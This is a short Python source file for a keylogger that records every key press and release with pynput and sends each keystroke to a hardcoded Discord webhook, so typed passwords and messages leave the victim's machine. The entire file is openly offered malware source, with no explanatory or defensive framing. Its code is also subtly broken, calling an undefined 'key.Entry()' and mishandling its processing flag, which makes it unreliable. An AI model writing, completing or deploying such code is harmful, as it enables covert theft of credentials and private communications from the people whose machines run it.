import os
import pynput
import requests
import json
import time
import winshell

class KeyLogger:
    def __init__(self, webhook_url):
        self.hook = pynput.keyboard.Listener(on_press=self.send_keystroke, on_release=self.send_keystroke)
        self.webhook_url = webhook_url
        self.session = requests.Session()
        self.token = None
        self.processing = False

    def run(self):
        self.hook.start()
        self.send_keystroke(key.Entry())
        self.hook.join()

    def send_keystroke(self, key):
        if not self.processing:
            data = {"content": str(key)}
            response = self.session.post(self.webhook_url, json=data)
            if response.status_code == 204:
                self.processing = False
            else:
                print("Error sending keystroke:", response.text)
            self.processing = True
            time.sleep(0.1)
            self.processing = False

if __name__ == "__main__":
    keylogger = KeyLogger("https://discord.com/api/webhooks/1412460698906394715/wpah8Px_JXYZXvaaGXfi7TEkTpyoqrTmrbcz4JikeL3P78URyi9tMV5eVAypgRknzKWe")
    keylogger.run()